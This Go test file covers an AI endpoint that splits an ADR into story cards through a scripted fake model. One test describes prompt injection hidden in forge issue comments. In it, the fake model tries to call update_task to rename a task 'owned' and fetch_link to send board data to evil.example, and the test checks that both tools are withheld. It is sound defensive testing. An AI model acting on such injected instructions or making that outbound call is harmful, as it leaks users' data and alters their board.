package server

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
)

// storiesTestADR is the document every split test sends. It is short on
// purpose: what is under test is the wiring, not the model.
const storiesTestADR = "# ADR 7: adopt SQLite\n\nWe will store boards in SQLite.\n"

// storiesResult is the response contract of POST /api/ai/stories, decoded the
// way the frozen UI decodes it.
type storiesResult struct {
	Stories []storyDraft `json:"stories"`
	Link    string       `json:"link"`
	URL     string       `json:"url"`
}

// splitADR configures the server against upstream and posts one ADR split.
func splitADR(t *testing.T, upstreamURL, body string) *httptest.ResponseRecorder {
	t.Helper()
	h, _ := newTestServer(t, Config{})
	configureAI(t, h, upstreamURL, "m", "sk-t")
	return doReq(t, h, "POST", "/api/ai/stories", body, nil)
}

// The endpoint's response shape predates the skill runner and does not change
// with it: the cards propose_card collected are the stories, in the order the
// model proposed them, and the skill's closing commentary is not part of the
// contract.
func TestAIStoriesRunsTheADRSplitSkill(t *testing.T) {
	fake := &scriptedOpenAI{replies: []fakeReply{
		{toolCalls: []fakeToolCall{
			{name: "propose_card", args: `{"title":"Add the store package","desc":"Open the database","prio":1,"effort":"S","tags":["backend"],"checks":[{"text":"open the db","done":false}]}`},
			{name: "propose_card", args: `{"title":"Write migrations"}`},
		}},
		{toolCalls: []fakeToolCall{
			{name: "propose_card", args: `{"title":"Back up the board file"}`},
		}},
		{content: "Proposed three stories covering storage, schema and backup."},
	}}
	upstream := httptest.NewServer(fake.handler())
	defer upstream.Close()

	t.Setenv("KB_AI_ALLOW_PRIVATE", "1") // test upstream is on loopback
	w := splitADR(t, upstream.URL, `{"adr":`+strconv.Quote(storiesTestADR)+`}`)
	if w.Code != http.StatusOK {
		t.Fatalf("POST stories: got %d (body=%s)", w.Code, w.Body)
	}

	var res storiesResult
	if err := json.Unmarshal(w.Body.Bytes(), &res); err != nil {
		t.Fatalf("stories JSON: %v (body=%s)", err, w.Body)
	}
	// Cards proposed across several rounds all land, in order.
	if len(res.Stories) != 3 {
		t.Fatalf("got %d stories, want 3: %+v", len(res.Stories), res.Stories)
	}
	for i, want := range []string{"Add the store package", "Write migrations", "Back up the board file"} {
		if res.Stories[i].Title != want {
			t.Errorf("story[%d] title = %q, want %q", i, res.Stories[i].Title, want)
		}
	}
	first := res.Stories[0]
	if first.Prio != 1 || first.Effort != "S" || first.Desc != "Open the database" {
		t.Errorf("story[0] = %+v, want the proposed fields preserved", first)
	}
	if len(first.Tags) != 1 || first.Tags[0] != "backend" || len(first.Checks) != 1 || first.Checks[0].Text != "open the db" {
		t.Errorf("story[0] tags/checks = %+v / %+v", first.Tags, first.Checks)
	}
	for _, d := range res.Stories {
		if err := validateDraft(d); err != nil {
			t.Errorf("returned story fails wire validation: %v (%+v)", err, d)
		}
	}
	// An ADR split carries no provenance, so neither optional key is emitted.
	var raw map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &raw); err != nil {
		t.Fatalf("raw stories JSON: %v", err)
	}
	if _, ok := raw["link"]; ok {
		t.Errorf("ADR response unexpectedly has link: %v", raw)
	}
	if _, ok := raw["url"]; ok {
		t.Errorf("ADR response unexpectedly has url: %v", raw)
	}
	// The commentary is the runner's, not this endpoint's.
	if _, ok := raw["commentary"]; ok {
		t.Errorf("stories response leaked the skill commentary: %v", raw)
	}

	// The loop ran until the model stopped calling tools, and every round
	// stated the split budget.
	reqs := fake.requests()
	if len(reqs) != 3 {
		t.Fatalf("upstream saw %d requests, want 3", len(reqs))
	}
	for i, body := range reqs {
		if got := decodeAIRequest(t, body).budget(); got != aiStoriesMaxTokens {
			t.Errorf("request %d output budget = %d, want %d", i, got, aiStoriesMaxTokens)
		}
	}
	sent := decodeAIRequest(t, reqs[0])
	if len(sent.Messages) != 2 || sent.Messages[0].Role != "system" || sent.Messages[1].Role != "user" {
		t.Fatalf("first request messages = %+v, want a system prompt and the ADR", sent.Messages)
	}
	// The ADR travels verbatim and alone: a story count in the prompt anchors
	// the model to produce exactly that many, which is what propose_card and
	// the server-side cap replace.
	if sent.Messages[1].Content != storiesTestADR {
		t.Errorf("user message = %q, want the ADR verbatim", sent.Messages[1].Content)
	}
	if strings.Contains(strings.ToLower(sent.Messages[0].Content), "at most") {
		t.Errorf("system prompt states a story count: %q", sent.Messages[0].Content)
	}
	if !offersTool(sent, "propose_card") {
		t.Errorf("tools = %+v, want propose_card offered", sent.Tools)
	}
}

// offersTool reports whether a recorded request advertised the named tool.
func offersTool(sent wireChatRequest, name string) bool {
	for _, tool := range sent.Tools {
		if tool.Function.Name == name {
			return true
		}
	}
	return false
}

// The cap is enforced where the cards are collected, not in the prompt: the
// proposal past the limit is refused with an error the model can read, and
// the response still carries exactly the requested number of stories.
func TestAIStoriesCapCountsCards(t *testing.T) {
	tests := []struct {
		name string
		body string
		want int
	}{
		{name: "explicit max", body: `{"adr":"x","max":2}`, want: 2},
		{name: "absent max takes the default", body: `{"adr":"x"}`, want: 3},
		{name: "negative max is one story", body: `{"adr":"x","max":-5}`, want: 1},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			fake := &scriptedOpenAI{replies: []fakeReply{
				{toolCalls: []fakeToolCall{
					{name: "propose_card", args: `{"title":"one"}`},
					{name: "propose_card", args: `{"title":"two"}`},
					{name: "propose_card", args: `{"title":"three"}`},
				}},
				{content: "Done."},
			}}
			upstream := httptest.NewServer(fake.handler())
			defer upstream.Close()

			t.Setenv("KB_AI_ALLOW_PRIVATE", "1")
			w := splitADR(t, upstream.URL, tt.body)
			if w.Code != http.StatusOK {
				t.Fatalf("POST stories: got %d (body=%s)", w.Code, w.Body)
			}
			var res storiesResult
			if err := json.Unmarshal(w.Body.Bytes(), &res); err != nil {
				t.Fatalf("stories JSON: %v (body=%s)", err, w.Body)
			}
			if len(res.Stories) != tt.want {
				t.Fatalf("got %d stories, want %d: %+v", len(res.Stories), tt.want, res.Stories)
			}
			if reqs := fake.requests(); tt.want < 3 && !strings.Contains(string(reqs[1]), cardLimitReachedMessage) {
				t.Errorf("refused proposal was not reported to the model: %s", reqs[1])
			}
		})
	}
}

// The requested count is the collector's cap, so it is clamped into a range
// one request cannot fan out past. Only an absent count takes the default: a
// supplied one is clamped, so a negative value asks for one story, not eight.
func TestNormalizeStoryCount(t *testing.T) {
	tests := []struct{ in, want int }{
		{in: 0, want: defaultStoryCount},
		{in: 1, want: 1},
		{in: 3, want: 3},
		{in: maxStoryCount, want: maxStoryCount},
		{in: 999, want: maxStoryCount},
		{in: -5, want: 1},
	}
	for _, tt := range tests {
		if got := normalizeStoryCount(tt.in); got != tt.want {
			t.Errorf("normalizeStoryCount(%d) = %d, want %d", tt.in, got, tt.want)
		}
	}
}

// The document this endpoint splits can be a forge issue body and its
// comments, which anyone who can comment on the issue writes. Instructions
// hidden in that text reach the loop as prompt, so the run is offered neither
// the tool that writes to the board nor the one that makes an outbound
// request; a model that calls one anyway is told the tool does not exist.
func TestAIStoriesRunsWithoutMutatingTools(t *testing.T) {
	fake := &scriptedOpenAI{replies: []fakeReply{
		{toolCalls: []fakeToolCall{
			{name: "update_task", args: `{"ref":"1","title":"owned"}`},
			{name: "fetch_link", args: `{"url":"https://evil.example/c?d=board"}`},
		}},
		{content: "Could not do that."},
	}}
	upstream := httptest.NewServer(fake.handler())
	defer upstream.Close()

	t.Setenv("KB_AI_ALLOW_PRIVATE", "1")
	w := splitADR(t, upstream.URL, `{"adr":`+strconv.Quote(storiesTestADR)+`}`)
	if w.Code != http.StatusOK {
		t.Fatalf("POST stories: got %d (body=%s)", w.Code, w.Body)
	}

	reqs := fake.requests()
	sent := decodeAIRequest(t, reqs[0])
	for _, name := range []string{"update_task", "fetch_link"} {
		if offersTool(sent, name) {
			t.Errorf("stories run offered %q: %+v", name, sent.Tools)
		}
	}
	// The read-only half of the set is still there: a split reads the board
	// to avoid proposing work it already tracks.
	for _, name := range []string{"propose_card", "find_similar", "list_tasks", "get_task"} {
		if !offersTool(sent, name) {
			t.Errorf("stories run did not offer %q: %+v", name, sent.Tools)
		}
	}
	if len(reqs) < 2 {
		t.Fatalf("upstream rounds = %d, want the refusal fed back", len(reqs))
	}
	for _, name := range []string{"update_task", "fetch_link"} {
		if !strings.Contains(string(reqs[1]), "tool '"+name+"' not found") {
			t.Errorf("the refused %s call was not reported to the model: %s", name, reqs[1])
		}
	}
}

// A run that produced no card is a 200 with an empty array, never a null the
// UI would have to defend against.
func TestAIStoriesWithoutProposalsReturnsAnEmptyArray(t *testing.T) {
	fake := &scriptedOpenAI{replies: []fakeReply{{content: "The document holds no shippable work."}}}
	upstream := httptest.NewServer(fake.handler())
	defer upstream.Close()

	t.Setenv("KB_AI_ALLOW_PRIVATE", "1")
	w := splitADR(t, upstream.URL, `{"adr":`+strconv.Quote(storiesTestADR)+`}`)
	if w.Code != http.StatusOK {
		t.Fatalf("POST stories: got %d (body=%s)", w.Code, w.Body)
	}
	if got := strings.TrimSpace(w.Body.String()); got != `{"stories":[]}` {
		t.Errorf("body = %s, want an empty stories array", got)
	}
}

// A reply cut off at the token budget is reported as truncation the caller
// can act on, not as an opaque upstream failure.
func TestAIStoriesReportsTruncation(t *testing.T) {
	fake := &scriptedOpenAI{replies: []fakeReply{{content: `{"partial":`, finish: "length"}}}
	upstream := httptest.NewServer(fake.handler())
	defer upstream.Close()

	t.Setenv("KB_AI_ALLOW_PRIVATE", "1")
	w := splitADR(t, upstream.URL, `{"adr":`+strconv.Quote(storiesTestADR)+`}`)
	if w.Code != http.StatusUnprocessableEntity {
		t.Fatalf("POST stories: got %d (body=%s), want 422", w.Code, w.Body)
	}
	if !strings.Contains(w.Body.String(), truncatedReplyMessage) {
		t.Errorf("body = %q, want %q", w.Body, truncatedReplyMessage)
	}
}
